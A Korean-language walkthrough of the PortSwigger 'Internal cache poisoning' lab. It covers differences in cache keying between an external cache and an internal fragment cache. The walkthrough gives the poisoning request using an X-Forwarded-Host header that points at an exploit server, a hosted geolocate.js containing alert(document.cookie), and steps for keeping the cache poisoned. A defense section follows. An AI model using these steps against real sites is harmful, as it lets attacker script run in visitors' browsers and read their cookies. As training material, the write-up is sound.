# Lab: Internal cache poisoning

## 개요

- **난이도**: Practitioner
- **주제**: Web Cache Poisoning — 다계층 캐시 / 내부 캐시(Internal Cache) 오염 / 조각(fragment) 캐싱
- **링크**: https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal

## 목표

외부 캐시와 내부 캐시의 키 처리 차이를 이용해 **내부 캐시 조각**을 오염시키고, 홈 페이지가 공격자 서버의 `/js/geolocate.js` 를 로드하게 만들어 `alert(document.cookie)` 를 실행시킨다.

## 취약 지점 — 다계층 캐시

```
[외부 캐시(External)]
  - 쿼리스트링을 캐시 키에 포함 (query 바꾸면 miss)
  - X-Forwarded-Host 를 캐시 키에 포함 (keyed)
  → 동적 cache-buster 로 우회 가능

[내부 캐시(Internal)]
  - 응답의 "조각(fragment)" 을 별도로 캐싱
    (예: canonical link, analytics.js 임포트, geolocate.js 임포트)
  - 쿼리스트링을 캐시 키에 포함하지 않음 (unkeyed)
  - X-Forwarded-Host 를 캐시 키에 포함하지 않음 (unkeyed)
  → X-Forwarded-Host 로 조각 오염 가능
```

```
[핵심 차이]
  동일한 X-Forwarded-Host 헤더가
    외부 캐시: keyed   → 일반 요청으로는 오염/조회 분리
    내부 캐시: unkeyed → 조각을 오염시킬 수 있음

  쿼리스트링도
    외부 캐시: keyed   → cache-buster 로 우회
    내부 캐시: unkeyed → 조각은 계속 캐시 히트
```

## 공격 단계

### 1단계 — 캐시 오라클 파악

홈 페이지를 Repeater 로 보낸다.
쿼리를 바꾸면 외부 캐시는 miss 되지만 응답에 반영됨을 확인한다.
(외부 캐시가 쿼리를 키에 포함)

### 2단계 — 동적 cache-buster

Param Miner 로 동적 cache-buster 파라미터를 붙여 외부 캐시를 우회한다.

### 3단계 — X-Forwarded-Host 반영 확인

```
GET /?<dynamic-cb>
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

응답에서 다음 URL 들이 익스플로잇 서버를 가리키는지 확인한다.

```
canonical link, analytics.js 임포트  → 즉시 변경됨
geolocate.js 임포트                 → 대부분 그대로 (내부 캐시 조각)
```

### 4단계 — 내부 캐시 조각 관찰

요청을 반복하다 보면 `geolocate.js` URL 조각도 익스플로잇 서버로 바뀐다.
cache-buster 를 넣어도 이 조각은 캐시 히트임을 확인한다.
(내부 캐시는 쿼리스트링을 키에 포함하지 않음)

### 5단계 — 내부 캐시가 헤더를 unkeyed 로 취급함 확인

`X-Forwarded-Host` 를 제거하고 보내면,
내부 캐시 조각은 여전히 익스플로잇 서버를 반영하지만 나머지 두 URL 은 원래대로 돌아온다.

→ **X-Forwarded-Host 는 외부 캐시에는 keyed, 내부 캐시에는 unkeyed**
→ 이 헤더로 내부 캐시 조각을 오염시킬 수 있다.

### 6단계 — 익스플로잇 서버 준비

```
파일 경로/이름: /js/geolocate.js
본문:          alert(document.cookie)
```

### 7단계 — 내부 캐시 오염

동적 cache-buster 를 끄고, `X-Forwarded-Host` 를 익스플로잇 서버로 설정해 반복 전송한다.
응답의 세 URL(canonical, analytics.js, geolocate.js)이 모두 익스플로잇 서버를 가리킬 때까지 반복한다.

→ 홈 페이지가 공격자 `geolocate.js`(= `alert(document.cookie)`)를 로드 → 랩 해결.

### 8단계 — 유지

피해자가 방문할 때까지 재전송으로 내부 캐시를 계속 오염 상태로 유지한다.

## 다계층 캐시 요약

| 항목 | 외부 캐시 | 내부 캐시 |
|------|-----------|-----------|
| 쿼리스트링 | keyed (buster로 우회) | unkeyed |
| X-Forwarded-Host | keyed | unkeyed (오염 벡터) |
| 캐싱 대상 | 전체 응답 | 응답 내 조각(fragment) |

```
[왜 위험한가]
  외부 캐시만 점검하면 "헤더가 keyed 라 안전" 하다고 오판
  → 내부 캐시가 그 헤더를 unkeyed 로 취급하면 조각이 오염됨
  계층마다 키 규칙이 다르면 한쪽 방어가 다른 쪽을 무력화
```

## 방어

```
[근본 원인]
  1) 내부 캐시가 응답 조각을 별도 캐싱하면서 입력(헤더/쿼리)을 키에 미포함
  2) X-Forwarded-Host 를 리소스 URL 생성에 사용
  3) 계층별 캐시 키 규칙 불일치

[올바른 방어]
  1. 내부 캐시 키 정규화
     - 조각에 영향을 주는 입력(헤더/쿼리/쿠키)을 모두 키에 포함
     - 외부/내부 캐시가 동일한 키 규칙 사용
  2. 클라이언트 헤더 불신
     - 리소스/URL 생성은 정식 도메인 설정값 사용
     - 프록시 경계에서 X-Forwarded-* 정규화/제거
  3. 조각 캐싱 정책 점검
     - 사용자/헤더에 따라 달라지는 조각은 캐시하지 않거나 키에 반영
  4. 캐시 계층 전반의 키/정규화 일관성 주기 점검
  5. SRI·CSP 로 외부 스크립트 로드 완화

[주의]
  "외부 캐시에서 keyed" 라는 사실이 "전체가 안전" 을 의미하지 않는다.
  다계층 캐시에서는 각 계층의 키 규칙을 개별적으로 확인해야 한다.
```

## 핵심 정리

- 외부 캐시는 쿼리스트링과 X-Forwarded-Host 를 keyed 로 취급했지만, 내부 캐시는 둘 다 unkeyed 였다.
- X-Forwarded-Host 로 응답 조각(특히 geolocate.js 임포트)을 오염시켜 공격자 `geolocate.js`(`alert(document.cookie)`)를 로드하게 만들었다.
- 같은 헤더가 캐시 계층마다 keyed/unkeyed 로 다르게 처리되는 것이 핵심 취약점이다.
- 방어는 내부 캐시 키 정규화와 계층 간 키 규칙 일치, 헤더 불신이다.

## 배운 점

- 캐시는 단일 계층이 아니며, 외부/내부 캐시의 키 규칙 차이가 새로운 공격 표면을 만든다.
- 외부 캐시에서 방어된 입력(헤더)도 내부 캐시에서는 unkeyed 일 수 있으므로 계층별로 점검해야 한다.
- 응답 조각(fragment) 캐싱은 눈에 잘 띄지 않아 놓치기 쉬운 오염 지점이다.
- 지금까지 001~013 을 통해 캐시 오염의 입력(헤더/쿠키/쿼리/body), 파싱·정규화·키 주입, 다계층 캐시까지 폭넓게 다뤘다.
